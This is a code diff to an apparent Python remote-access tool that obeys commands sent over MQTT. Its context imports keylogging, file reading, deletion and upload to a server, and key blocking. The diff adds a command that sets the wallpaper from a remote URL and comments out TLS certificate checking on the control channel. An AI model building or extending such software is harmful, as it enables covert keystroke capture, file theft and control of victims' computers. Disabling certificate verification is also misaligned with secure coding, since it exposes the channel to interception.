@@ -21,7 +21,7 @@ from notepadType import notepad_write,draw_heart,start_random_move,stop_random_m
 from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
-from systemcontrol import display_off,display_on,full_volume,mute_volume
+from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url
 
 def resource_path(relative_path):
     # Works for both PyInstaller EXE and dev Python
@@ -135,7 +135,8 @@ def handle_msg(msg):
         elif msg == "fullvolume":
             full_volume()
         elif msg == "mutevolume":
-            mute_volume()              
+            mute_volume()         
+
         elif msg =="startrandommove":
             start_random_move()
         elif msg == "stoprandommove":
@@ -209,6 +210,10 @@ def handle_msg(msg):
         elif msg.startswith("unblockkey"):
             key = msg[len("unblockkey "):]
             safe_thread(keyboard.unblock_key, key)
+
+        elif msg.startswith("urlwallpaper"):
+            link = msg[len("urlwallpaper "):]
+            safe_thread(set_wallpaper_from_url,link)    
 
         elif msg.startswith("remap"):
             parts = msg[len("remap "):].split()
@@ -384,9 +389,9 @@ def on_disconnect(client, userdata, rc):
 # MQTT client setup
 client = mqtt.Client(client_id=pc_id, protocol=mqtt.MQTTv311)
 client.username_pw_set(USERNAME, PASSWORD)
-ca_path = resource_path("emqxsl-ca.crt")
-client.tls_set(ca_certs=ca_path, cert_reqs=ssl.CERT_REQUIRED)
-client.tls_insecure_set(False)
+# ca_path = resource_path("emqxsl-ca.crt")
+# client.tls_set(ca_certs=ca_path, cert_reqs=ssl.CERT_REQUIRED)
+# client.tls_insecure_set(True)
 client.on_connect = on_connect
 client.on_message = on_message
 client.on_disconnect = on_disconnect
